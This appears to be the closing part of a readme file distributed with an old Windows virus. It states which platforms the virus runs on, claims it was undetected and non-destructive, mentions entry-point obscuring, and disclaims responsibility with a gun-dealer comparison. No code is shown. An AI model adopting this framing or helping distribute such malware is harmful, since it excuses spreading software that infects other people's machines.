The virus works fine on Win9x/Win nt4 platforms, but don't work
on Win 2k platform.

This virus is undetected at the time it was completed,
yet it's not destructive, but it's a computer virus so use it at your own
risks !

I can't be held as responsible for use/misuse of this program.
This program was only designed for research aims.

(Is fire guns dealers can be held also as responsible for the death of
a young guy somewhere in the world when someone uses a machine gun
to kill him ?)



(*) E.P.O=Entry Point Obscured
-----------------------------------------------------------------[READ.1ST]---
